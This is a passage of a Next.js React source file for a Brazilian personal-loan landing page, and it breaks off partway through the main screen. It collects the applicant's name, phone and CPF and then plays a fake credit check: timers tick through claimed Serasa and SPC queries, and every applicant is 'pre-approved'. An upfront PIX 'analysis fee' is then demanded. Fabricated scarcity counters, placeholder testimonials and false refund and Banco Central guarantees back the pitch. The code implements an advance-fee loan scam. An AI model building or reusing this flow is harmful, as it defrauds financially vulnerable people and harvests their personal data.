"use client";

import { useState, useEffect, useRef, useCallback } from "react";

type Etapa = "landing" | "formulario" | "analise" | "aprovado" | "pagamento" | "liberado";

interface DadosLead {
  nome: string;
  telefone: string;
  cpf: string;
  valorEmprestimo: number;
  tipoEmprestimo: "SEMANAL" | "QUINZENAL";
}

interface DadosPix {
  txId: string;
  qrCode: string;
  qrCodeBase64?: string;
  valor: number;
}

const WHATSAPP_NUMBER = process.env.NEXT_PUBLIC_WHATSAPP_NUMBER || "5561999999999";
const TAXA_ANALISE = 19.9;

function fmtBRL(v: number, decimals = 0): string {
  const parts = v.toFixed(decimals).split(".");
  parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
  return parts.join(",");
}

// ── Tracking helpers ──────────────────────────────────────────────
function getSessionId(): string {
  try {
    const key = "bc_session";
    const existing = sessionStorage.getItem(key);
    if (existing) return existing;
    const id = crypto.randomUUID();
    sessionStorage.setItem(key, id);
    return id;
  } catch { return "no-session"; }
}

function getUTMs() {
  try {
    const p = new URLSearchParams(window.location.search);
    return {
      utmSource:   p.get("utm_source")   ?? undefined,
      utmMedium:   p.get("utm_medium")   ?? undefined,
      utmCampaign: p.get("utm_campaign") ?? undefined,
      utmContent:  p.get("utm_content")  ?? undefined,
      utmTerm:     p.get("utm_term")     ?? undefined,
    };
  } catch { return {}; }
}

function getDispositivo(): string {
  try {
    const ua = navigator.userAgent;
    if (/Mobi|Android|iPhone|iPad/i.test(ua)) return "mobile";
    if (/Tablet|iPad/i.test(ua)) return "tablet";
    return "desktop";
  } catch { return "unknown"; }
}

function trackEvent(evento: string, dados: Record<string, unknown> = {}) {
  try {
    const sessionId = getSessionId();
    fetch("/api/track/event", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sessionId, evento, dados }),
      keepalive: true,
    }).catch(() => {});
  } catch { /* silently ignore */ }
}
// ─────────────────────────────────────────────────────────────────

export default function OfertaLanding() {
  const [etapa, setEtapa] = useState<Etapa>("landing");
  const [dados, setDados] = useState<DadosLead>({
    nome: "",
    telefone: "",
    cpf: "",
    valorEmprestimo: 1000,
    tipoEmprestimo: "SEMANAL",
  });
  const [dadosPix, setDadosPix] = useState<DadosPix | null>(null);
  const [copiado, setCopiado] = useState(false);
  const [erroForm, setErroForm] = useState("");
  const vagasHoje = 5;
  const atendidosHoje = 22;
  const formRef = useRef<HTMLDivElement>(null);
  const simulatorRef = useRef<HTMLDivElement>(null);
  const topoRef = useRef<HTMLDivElement>(null);

  // Track page_view on mount
  useEffect(() => {
    trackEvent("page_view", {
      ...getUTMs(),
      dispositivo: getDispositivo(),
      referrer: document.referrer || undefined,
    });
  }, []);

  const scrollParaSimulador = () => {
    simulatorRef.current?.scrollIntoView({ behavior: "smooth" });
  };
  const scrollParaForm = () => {
    formRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    if (etapa === "analise") {
      trackEvent("analise_view");
      const timer = setTimeout(() => setEtapa("aprovado"), 10500);
      return () => clearTimeout(timer);
    }
  }, [etapa]);

  useEffect(() => {
    if (etapa === "aprovado") {
      trackEvent("aprovado_view");
      const timer = setTimeout(() => setEtapa("pagamento"), 4000);
      return () => clearTimeout(timer);
    }
  }, [etapa]);

  useEffect(() => {
    if (etapa === "pagamento") trackEvent("pagamento_view");
  }, [etapa]);

  useEffect(() => {
    if (etapa !== "pagamento" || !dadosPix) return;
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/pix/status?txId=${dadosPix.txId}`);
        const data = await res.json();
        if (data.status === "CONCLUIDA" || data.status === "PAGO") {
          trackEvent("pago", { txId: dadosPix.txId, valor: TAXA_ANALISE });
          setEtapa("liberado");
        }
      } catch { /* silently retry */ }
    }, 4000);
    return () => clearInterval(interval);
  }, [etapa, dadosPix]);

  const formatarCPF = (v: string) => {
    const nums = v.replace(/\D/g, "").slice(0, 11);
    if (nums.length <= 3) return nums;
    if (nums.length <= 6) return `${nums.slice(0, 3)}.${nums.slice(3)}`;
    if (nums.length <= 9) return `${nums.slice(0, 3)}.${nums.slice(3, 6)}.${nums.slice(6)}`;
    return `${nums.slice(0, 3)}.${nums.slice(3, 6)}.${nums.slice(6, 9)}-${nums.slice(9)}`;
  };

  const formatarTelefone = (v: string) => {
    const nums = v.replace(/\D/g, "").slice(0, 11);
    if (nums.length <= 2) return nums;
    if (nums.length <= 7) return `(${nums.slice(0, 2)}) ${nums.slice(2)}`;
    return `(${nums.slice(0, 2)}) ${nums.slice(2, 7)}-${nums.slice(7)}`;
  };

  const handleSubmitForm = useCallback(async () => {
    const cpfLimpo = dados.cpf.replace(/\D/g, "");
    const telLimpo = dados.telefone.replace(/\D/g, "");
    if (!dados.nome.trim() || dados.nome.trim().length < 3) {
      setErroForm("Digite seu nome completo");
      return;
    }
    if (telLimpo.length < 10) {
      setErroForm("Digite um telefone válido");
      return;
    }
    if (cpfLimpo.length !== 11) {
      setErroForm("Digite um CPF válido");
      return;
    }
    setErroForm("");
    setEtapa("analise");
    window.scrollTo({ top: 0, behavior: "smooth" });

    // Track form submission
    trackEvent("form_submit", {
      nome: dados.nome,
      cpf: cpfLimpo,
      telefone: telLimpo,
      valorEmprestimo: dados.valorEmprestimo,
      tipoEmprestimo: dados.tipoEmprestimo,
    });

    try {
      const res = await fetch("/api/pix/gerar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          nome: dados.nome,
          cpf: cpfLimpo,
          telefone: telLimpo,
          valor: TAXA_ANALISE,
        }),
      });
      const pixData = await res.json();
      if (!pixData.error) {
        setDadosPix(pixData);
        trackEvent("pix_gerado", { txId: pixData.txId, valor: TAXA_ANALISE });
      }
    } catch (err) {
      console.error("Fetch PIX error:", err);
    }
  }, [dados]);

  const copiarPix = async () => {
    if (!dadosPix?.qrCode) return;
    try {
      await navigator.clipboard.writeText(dadosPix.qrCode);
    } catch {
      const el = document.createElement("textarea");
      el.value = dadosPix.qrCode;
      document.body.appendChild(el);
      el.select();
      document.execCommand("copy");
      document.body.removeChild(el);
    }
    setCopiado(true);
    trackEvent("pix_copiado");
    setTimeout(() => setCopiado(false), 3000);
  };

  const taxaJuros = dados.tipoEmprestimo === "SEMANAL" ? 0.2 : 0.3;
  const valorJuros = dados.valorEmprestimo * taxaJuros;
  const valorTotal = dados.valorEmprestimo + valorJuros;

  const estilos = <style>{`
    .oferta-page {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #ffffff;
      color: #1e293b;
      min-height: 100vh;
    }

    .urgency-bar {
      background: linear-gradient(90deg, #dc2626, #ef4444);
      color: white;
      text-align: center;
      padding: 10px 16px;
      font-size: 13px;
      font-weight: 600;
      letter-spacing: 0.3px;
    }

    .oferta-nav {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 12px 16px;
      border-bottom: 1px solid #f1f5f9;
      background: white;
      position: sticky;
      top: 0;
      z-index: 50;
    }

    .logo-icon {
      width: 32px; height: 32px;
      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
      border-radius: 8px;
      display: flex; align-items: center; justify-content: center;
      color: white; font-weight: 800; font-size: 16px;
    }
    .logo-icon-sm {
      width: 24px; height: 24px;
      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
      border-radius: 6px;
      display: flex; align-items: center; justify-content: center;
      color: white; font-weight: 800; font-size: 12px;
    }

    .btn-small {
      background: linear-gradient(135deg, #f59e0b, #d97706);
      color: white; font-weight: 700; font-size: 13px;
      padding: 8px 16px; border-radius: 8px; border: none; cursor: pointer;
      transition: transform 0.2s;
    }
    .btn-small:hover { transform: scale(1.03); }

    .btn-primary {
      background: linear-gradient(135deg, #f59e0b, #d97706);
      color: white; font-weight: 700; font-size: 16px;
      padding: 14px 28px; border-radius: 12px; border: none; cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      box-shadow: 0 4px 14px rgba(245, 158, 11, 0.4);
    }
    .btn-primary:hover { transform: scale(1.03); box-shadow: 0 6px 20px rgba(245, 158, 11, 0.5); }
    .btn-lg { font-size: 17px; padding: 16px 32px; }

    .btn-whatsapp {
      display: inline-flex; align-items: center; gap: 12px;
      background: #25D366; color: white; font-weight: 700; font-size: 17px;
      padding: 16px 32px; border-radius: 14px; border: none; cursor: pointer;
      text-decoration: none; width: 100%; justify-content: center;
      transition: transform 0.2s, box-shadow 0.2s;
      box-shadow: 0 4px 14px rgba(37, 211, 102, 0.4);
    }
    .btn-whatsapp:hover { transform: scale(1.03); }

    .badge {
      display: inline-block; padding: 6px 14px; border-radius: 20px;
      font-size: 13px; font-weight: 600;
    }
    .badge-blue { background: #eff6ff; color: #2563eb; }
    .badge-green { background: #f0fdf4; color: #16a34a; }
    .badge-amber { background: #fffbeb; color: #d97706; }

    .hero-section {
      padding: 48px 0 40px; text-align: center;
      background: linear-gradient(180deg, #f8fafc 0%, #ffffff 100%);
    }
    .hero-title {
      font-size: clamp(1.75rem, 5vw, 2.5rem);
      font-weight: 800; color: #1e293b; line-height: 1.2; margin-bottom: 16px;
    }
    .text-gradient {
      background: linear-gradient(135deg, #3b82f6, #8b5cf6);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .hero-subtitle {
      color: #64748b; font-size: 17px; margin-bottom: 28px;
      line-height: 1.6; max-width: 480px; margin-left: auto; margin-right: auto;
    }
    .trust-row {
      display: flex; flex-wrap: wrap; justify-content: center; gap: 16px;
      font-size: 13px; color: #64748b;
    }

    .stats-bar {
      padding: 20px 16px;
      border-top: 1px solid #f1f5f9; border-bottom: 1px solid #f1f5f9;
      background: white;
    }
    .stats-grid {
      display: grid; grid-template-columns: repeat(3, 1fr);
      max-width: 500px; margin: 0 auto; text-align: center; gap: 8px;
    }
    .stat-number { font-size: clamp(1.25rem, 4vw, 1.75rem); font-weight: 800; }
    .stat-label { font-size: 11px; color: #94a3b8; margin-top: 2px; }

    .section-white { padding: 48px 0; background: white; }
    .section-gray { padding: 48px 0; background: #f8fafc; }
    .section-title { font-size: 1.5rem; font-weight: 700; text-align: center; color: #1e293b; margin-bottom: 8px; }
    .section-subtitle { text-align: center; color: #94a3b8; margin-bottom: 28px; }

    .simulator-card {
      background: white; border: 2px solid #e2e8f0; border-radius: 16px;
      padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06);
    }
    .field-label { display: block; font-size: 13px; font-weight: 600; color: #475569; margin-bottom: 8px; }
    .sim-value {
      text-align: center; font-size: 2.25rem; font-weight: 800; color: #f59e0b; margin-bottom: 12px;
    }

    .range-input {
      width: 100%; height: 8px; border-radius: 4px;
      appearance: none; -webkit-appearance: none;
      background: linear-gradient(90deg, #3b82f6, #8b5cf6);
      outline: none; cursor: pointer;
    }
    .range-input::-webkit-slider-thumb {
      appearance: none; -webkit-appearance: none;
      width: 24px; height: 24px; border-radius: 50%;
      background: white; border: 3px solid #3b82f6;
      box-shadow: 0 2px 6px rgba(0,0,0,0.15); cursor: pointer;
    }
    .range-labels { display: flex; justify-content: space-between; font-size: 11px; color: #94a3b8; margin-top: 6px; }

    .tipo-btn {
      padding: 12px; border-radius: 10px; border: 2px solid #e2e8f0;
      background: white; cursor: pointer; text-align: left;
      transition: all 0.2s; display: flex; flex-direction: column; gap: 2px;
    }
    .tipo-btn strong { font-size: 15px; color: #1e293b; }
    .tipo-btn small { font-size: 11px; color: #94a3b8; }
    .tipo-btn-active { border-color: #3b82f6; background: #eff6ff; }
    .tipo-btn-active strong { color: #1d4ed8; }

    .sim-result {
      background: #f8fafc; border-radius: 12px; padding: 16px;
      margin: 20px 0; display: flex; flex-direction: column; gap: 8px;
    }
    .sim-result-item { display: flex; justify-content: space-between; align-items: center; }
    .sim-result-label { font-size: 13px; color: #94a3b8; }
    .sim-result-value { font-size: 15px; font-weight: 700; color: #1e293b; }

    .secure-text { text-align: center; color: #94a3b8; font-size: 12px; margin-top: 12px; }

    .testimonials-grid { display: grid; gap: 12px; margin-top: 20px; }
    @media (min-width: 640px) { .testimonials-grid { grid-template-columns: repeat(3, 1fr); } }
    .testimonial-card {
      background: white; border: 1px solid #e2e8f0; border-radius: 12px; padding: 16px;
    }
    .stars { color: #fbbf24; font-size: 13px; margin-bottom: 8px; letter-spacing: 2px; }
    .testimonial-text { color: #475569; font-size: 13px; margin-bottom: 12px; line-height: 1.5; }
    .avatar {
      width: 28px; height: 28px; border-radius: 50%;
      background: #eff6ff; display: flex; align-items: center; justify-content: center;
      color: #3b82f6; font-weight: 700; font-size: 12px;
    }

    .form-card {
      background: white; border: 2px solid #e2e8f0; border-radius: 16px;
      padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06);
      display: flex; flex-direction: column; gap: 16px;
    }
    .form-group { display: flex; flex-direction: column; }
    .form-input {
      width: 100%; padding: 14px 16px; border: 2px solid #e2e8f0; border-radius: 10px;
      font-size: 15px; color: #1e293b; background: #f8fafc; outline: none;
      transition: border-color 0.2s;
    }
    .form-input:focus { border-color: #3b82f6; background: white; }
    .form-input::placeholder { color: #cbd5e1; }

    .error-msg {
      background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px;
      padding: 10px 14px; color: #dc2626; font-size: 13px;
    }

    .form-summary {
      background: #f8fafc; border-radius: 10px; padding: 14px; text-align: center;
    }

    .card {
      background: white; border: 1px solid #e2e8f0; border-radius: 16px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
    }

    .faq-item {
      border: 1px solid #e2e8f0; border-radius: 10px; overflow: hidden; margin-bottom: 8px;
    }
    .faq-btn {
      width: 100%; display: flex; align-items: center; justify-content: space-between;
      padding: 14px 16px; background: white; border: none; cursor: pointer;
      font-size: 14px; font-weight: 600; color: #1e293b; text-align: left;
    }
    .faq-btn:hover { background: #f8fafc; }
    .faq-arrow { font-size: 12px; color: #94a3b8; transition: transform 0.2s; }
    .faq-arrow-open { transform: rotate(180deg); }
    .faq-answer { padding: 0 16px 14px; color: #64748b; font-size: 13px; line-height: 1.6; }

    .proof-scroll {
      display: flex; gap: 10px; overflow-x: auto; padding-bottom: 8px;
      scroll-snap-type: x mandatory; -webkit-overflow-scrolling: touch;
    }
    .proof-scroll::-webkit-scrollbar { display: none; }
    .proof-card {
      flex-shrink: 0; width: 130px; background: white; border: 1px solid #e2e8f0;
      border-radius: 12px; padding: 12px; text-align: center;
      scroll-snap-align: start;
    }
    .proof-img-placeholder {
      width: 100%; height: 70px; background: #f1f5f9; border-radius: 8px;
      display: flex; align-items: center; justify-content: center;
      font-size: 24px; margin-bottom: 8px; color: #94a3b8;
    }

    .guarantee-card {
      flex: 1; background: #f8fafc; border: 1px solid #e2e8f0;
      border-radius: 10px; padding: 12px; text-align: center;
    }

    .spinner-outer {
      position: absolute; inset: 0; border-radius: 50%;
      border: 4px solid #e2e8f0; border-top-color: #3b82f6;
      animation: spin 1s linear infinite;
    }
    .spinner-inner {
      position: absolute; inset: 10px; border-radius: 50%;
      border: 4px solid transparent; border-top-color: #f59e0b;
      animation: spin 1.5s linear infinite reverse;
    }
    .spinner-small {
      width: 16px; height: 16px; border-radius: 50%;
      border: 2px solid #e2e8f0; border-top-color: #3b82f6;
      animation: spin 0.8s linear infinite;
    }

    .approved-icon {
      width: 80px; height: 80px; margin: 0 auto 20px;
      background: #f0fdf4; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      animation: bounce-in 0.6s ease-out;
    }

    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes bounce-in {
      0% { transform: scale(0.3); opacity: 0; }
      50% { transform: scale(1.1); }
      70% { transform: scale(0.95); }
      100% { transform: scale(1); opacity: 1; }
    }
    @keyframes fade-up {
      from { opacity: 0; transform: translateY(8px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .anim-fade-up { animation: fade-up 0.5s ease-out both; }
  `}</style>;

  // ── TELA: Análise de crédito ──
  if (etapa === "analise") {
    return (
      <div className="oferta-page" ref={topoRef}>
        {estilos}
        <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "2rem 1rem" }}>
          <div style={{ textAlign: "center", maxWidth: 420, width: "100%" }}>
            {/* Ícone animado */}
            <div style={{ position: "relative", width: 80, height: 80, margin: "0 auto 1.5rem" }}>
              <div className="spinner-outer" />
              <div className="spinner-inner" />
              <svg style={{ position: "absolute", top: "50%", left: "50%", transform: "translate(-50%,-50%)" }} width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
            </div>

            <h2 style={{ fontSize: "1.5rem", fontWeight: 700, color: "#1e293b", marginBottom: 4 }}>Analisando seu perfil...</h2>
            <p style={{ color: "#64748b", marginBottom: "1.5rem", fontSize: 14 }}>
              Por favor, <strong>não feche esta página</strong>. Análise em andamento.
            </p>

            {/* Barra de progresso */}
            <AnaliseProgressBar totalMs={10500} />

            {/* Checklist */}
            <div style={{ display: "flex", flexDirection: "column", gap: 14, textAlign: "left", marginTop: "1.5rem", background: "#f8fafc", borderRadius: 12, padding: "1.25rem 1rem" }}>
              <AnaliseStep label="Verificando CPF na base federal" delay={0} />
              <AnaliseStep label="Consultando Serasa" delay={1200} />
              <AnaliseStep label="Consultando SPC Brasil" delay={2600} />
              <AnaliseStep label="Analisando histórico de pagamentos" delay={4000} />
              <AnaliseStep label="Verificando renda estimada" delay={5400} />
              <AnaliseStep label="Calculando capacidade de pagamento" delay={6800} />
              <AnaliseStep label="Definindo limite disponível" delay={8200} />
              <AnaliseStep label="Gerando proposta personalizada" delay={9400} />
            </div>

            <p style={{ marginTop: "1.25rem", fontSize: 12, color: "#94a3b8" }}>
              🔒 Seus dados são protegidos com criptografia SSL
            </p>
          </div>
        </div>
      </div>
    );
  }

  // ── TELA: Aprovado ──
  if (etapa === "aprovado") {
    return (
      <div className="oferta-page" ref={topoRef}>
        {estilos}
        <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "2rem 1rem" }}>
          <div style={{ textAlign: "center", maxWidth: 400 }}>
            <div className="approved-icon">
              <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
            </div>
            <span className="badge badge-green">PRE-APROVADO</span>
            <h2 style={{ fontSize: "1.75rem", fontWeight: 700, color: "#1e293b", margin: "12px 0 4px" }}>
              Parabéns, {dados.nome.split(" ")[0]}!
            </h2>
            <p style={{ color: "#94a3b8", marginBottom: 24 }}>Seu crédito foi pré-aprovado</p>
            <div className="card" style={{ padding: 24, marginBottom: 24 }}>
              <div style={{ color: "#94a3b8", fontSize: 13, marginBottom: 4 }}>Valor pré-aprovado</div>
              <div style={{ fontSize: "2.5rem", fontWeight: 800, color: "#f59e0b" }}>
                R$ {fmtBRL(dados.valorEmprestimo)}
              </div>
              <div style={{ color: "#94a3b8", fontSize: 13, marginTop: 4 }}>
                {dados.tipoEmprestimo === "SEMANAL" ? "Semanal" : "Quinzenal"} &middot; Juros de {(taxaJuros * 100).toFixed(0)}%
              </div>
            </div>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, color: "#94a3b8", fontSize: 14 }}>
              <div className="spinner-small" />
              Preparando liberação...
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── TELA: Pagamento PIX ──
  if (etapa === "pagamento") {
    return (
      <div className="oferta-page" ref={topoRef}>
        {estilos}
        <div style={{ minHeight: "100vh", padding: "1.5rem 1rem" }}>
          <div style={{ maxWidth: 440, margin: "0 auto" }}>
            {/* Header */}
            <div style={{ textAlign: "center", marginBottom: 20 }}>
              <span className="badge badge-green">✅ Crédito Pré-Aprovado</span>
              <h2 style={{ fontSize: "1.5rem", fontWeight: 800, color: "#1e293b", margin: "12px 0 4px" }}>
                Falta só um passo, {dados.nome.split(" ")[0]}!
              </h2>
              <p style={{ color: "#64748b", fontSize: 14, lineHeight: 1.5 }}>
                Seu empréstimo de{" "}
                <strong style={{ color: "#f59e0b", fontSize: 16 }}>R$ {fmtBRL(dados.valorEmprestimo)}</strong>{" "}
                está reservado e pronto para liberação
              </p>
            </div>

            {/* Explicação da taxa */}
            <div style={{ background: "#eff6ff", border: "1px solid #bfdbfe", borderRadius: 14, padding: 18, marginBottom: 16 }}>
              <div style={{ fontWeight: 700, color: "#1e3a5f", fontSize: 14, marginBottom: 8 }}>
                💡 Por que existe essa taxa?
              </div>
              <p style={{ color: "#475569", fontSize: 13, lineHeight: 1.6, margin: 0 }}>
                Para garantir um atendimento <strong>sério e personalizado</strong>, cobramos uma taxa única que cobre os custos de:
                infraestrutura de análise de crédito, equipe dedicada de consultores financeiros, e suporte prioritário via WhatsApp.
                Isso nos permite oferecer <strong>aprovação real em até 30 minutos</strong> com atendimento humano.
              </p>
            </div>

            {/* Card principal */}
            <div className="card" style={{ padding: 20, marginBottom: 16 }}>
              <div style={{ textAlign: "center", marginBottom: 16 }}>
                <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 1 }}>Taxa única de cadastro e análise</div>
                <div style={{ fontSize: "2.25rem", fontWeight: 800, color: "#1e293b", marginTop: 4 }}>
                  R$ {TAXA_ANALISE.toFixed(2).replace(".", ",")}
                </div>
                <div style={{ color: "#16a34a", fontSize: 12, fontWeight: 600, marginTop: 4 }}>
                  Valor reembolsável caso não seja aprovado
                </div>
              </div>

              {/* O que está incluso */}
              <div style={{ background: "#f8fafc", borderRadius: 12, padding: 14, marginBottom: 16 }}>
                <div style={{ fontWeight: 700, fontSize: 13, color: "#1e293b", marginBottom: 10 }}>O que está incluso:</div>
                <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                  {[
                    "Consulta completa de crédito no seu CPF",
                    "Análise personalizada do seu perfil financeiro",
                    "Consultor financeiro dedicado via WhatsApp",
                    "Atendimento prioritário (fila preferencial)",
                    "Liberação do empréstimo em até 30 minutos",
                    "Suporte pós-empréstimo para dúvidas",
                  ].map((txt) => (
                    <div key={txt} style={{ display: "flex", alignItems: "flex-start", gap: 8 }}>
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, marginTop: 2 }}><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
                      <span style={{ color: "#475569", fontSize: 13 }}>{txt}</span>
                    </div>
                  ))}
                </div>
              </div>

              {/* PIX */}
              <div style={{ border: "2px solid #fbbf24", borderRadius: 12, padding: 16, background: "#fffbeb" }}>
                <div style={{ textAlign: "center", color: "#92400e", fontSize: 12, fontWeight: 700, marginBottom: 12, textTransform: "uppercase", letterSpacing: 0.5 }}>
                  Pague via PIX &mdash; Copia e Cola
                </div>
                {dadosPix?.qrCode ? (
                  <>
                    <div style={{ background: "#f8fafc", borderRadius: 8, padding: 12, marginBottom: 12, wordBreak: "break-all", fontSize: 11, color: "#64748b", fontFamily: "monospace", maxHeight: 72, overflow: "auto", border: "1px solid #e2e8f0" }}>
                      {dadosPix.qrCode}
                    </div>
                    <button onClick={copiarPix} className="btn-primary" style={{ width: "100%", fontSize: 16 }}>
                      {copiado ? "✓ Código copiado!" : "📋 Copiar código PIX"}
                    </button>
                  </>
                ) : (
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, padding: "16px 0", color: "#94a3b8", fontSize: 14 }}>
                    <div className="spinner-small" />
                    Gerando código PIX...
                  </div>
                )}
              </div>

              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, color: "#94a3b8", fontSize: 12, marginTop: 14 }}>
                <div className="spinner-small" />
                Aguardando confirmação do pagamento...
              </div>
            </div>

            {/* Prova social - prints de empréstimos */}
            <div style={{ marginBottom: 16 }}>
              <div style={{ fontWeight: 700, fontSize: 13, color: "#1e293b", textAlign: "center", marginBottom: 10 }}>
                📱 Empréstimos liberados recentemente
              </div>
              <div className="proof-scroll">
                {/* PLACEHOLDER: substitua os src por prints reais de empréstimos */}
                {[
                  { nome: "Carlos", valor: "R$ 800", tempo: "há 23 min" },
                  { nome: "Ana", valor: "R$ 1.500", tempo: "há 1h" },
                  { nome: "Pedro", valor: "R$ 2.000", tempo: "há 2h" },
                ].map((p) => (
                  <div key={p.nome} className="proof-card">
                    <div className="proof-img-placeholder">📸</div>
                    <div style={{ fontSize: 11, color: "#475569", fontWeight: 600 }}>{p.nome} recebeu</div>
                    <div style={{ fontSize: 14, color: "#16a34a", fontWeight: 800 }}>{p.valor}</div>
                    <div style={{ fontSize: 10, color: "#94a3b8" }}>{p.tempo}</div>
                  </div>
                ))}
              </div>
              <p style={{ textAlign: "center", color: "#94a3b8", fontSize: 11, marginTop: 8 }}>
                * Quando você enviar os prints reais, eles aparecerão aqui
              </p>
            </div>

            {/* Garantias */}
            <div style={{ display: "flex", gap: 8, marginBottom: 16 }}>
              <div className="guarantee-card">
                <div style={{ fontSize: 20, marginBottom: 4 }}>🔒</div>
                <div style={{ fontSize: 11, fontWeight: 600, color: "#1e293b" }}>100% Seguro</div>
                <div style={{ fontSize: 10, color: "#94a3b8" }}>Pagamento via PIX protegido pelo Banco Central</div>
              </div>
              <div className="guarantee-card">
                <div style={{ fontSize: 20, marginBottom: 4 }}>💰</div>
                <div style={{ fontSize: 11, fontWeight: 600, color: "#1e293b" }}>Reembolso</div>
                <div style={{ fontSize: 10, color: "#94a3b8" }}>Devolvemos o valor se não for aprovado</div>
              </div>
              <div className="guarantee-card">
                <div style={{ fontSize: 20, marginBottom: 4 }}>⚡</div>
                <div style={{ fontSize: 11, fontWeight: 600, color: "#1e293b" }}>Liberação rápida</div>
                <div style={{ fontSize: 10, color: "#94a3b8" }}>Dinheiro na sua mão em até 30 min</div>
              </div>
            </div>

            <div style={{ textAlign: "center", color: "#94a3b8", fontSize: 11, display: "flex", alignItems: "center", justifyContent: "center", gap: 4 }}>
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
              Pagamento 100% seguro via PIX &middot; Proteção do Banco Central
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── TELA: Liberado (WhatsApp) ──
  if (etapa === "liberado") {
    const msg = encodeURIComponent(
      `Olá! Sou ${dados.nome}, acabei de realizar o pagamento da taxa de análise. Meu CPF: ${dados.cpf}. Quero liberar meu empréstimo de R$ ${fmtBRL(dados.valorEmprestimo)} (${dados.tipoEmprestimo === "SEMANAL" ? "semanal" : "quinzenal"}).`
    );
    return (
      <div className="oferta-page" ref={topoRef}>
        {estilos}
        <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "2rem 1rem" }}>
          <div style={{ textAlign: "center", maxWidth: 400 }}>
            <div className="approved-icon">
              <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
            </div>
            <h2 style={{ fontSize: "1.75rem", fontWeight: 700, color: "#1e293b", marginBottom: 8 }}>Pagamento confirmado!</h2>
            <p style={{ color: "#64748b", marginBottom: 32 }}>
              Seu empréstimo de{" "}
              <strong style={{ color: "#f59e0b" }}>R$ {fmtBRL(dados.valorEmprestimo)}</strong>{" "}
              está pronto para ser liberado
            </p>
            <a
              href={`https://wa.me/${WHATSAPP_NUMBER}?text=${msg}`}
              target="_blank"
              rel="noopener noreferrer"
              className="btn-whatsapp"
              onClick={() => trackEvent("whatsapp_aberto")}
            >
              <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
              Falar com consultor no WhatsApp
            </a>
            <p style={{ color: "#94a3b8", fontSize: 12, marginTop: 16 }}>
              Nosso consultor finalizará a liberação do seu crédito
            </p>
          </div>
        </div>
      </div>
    );
  }

  // ── TELA PRINCIPAL: Landing + Simulador + Form ──
  return (
    <div className="oferta-page" ref={topoRef}>
      {/* Barra de urgência */}
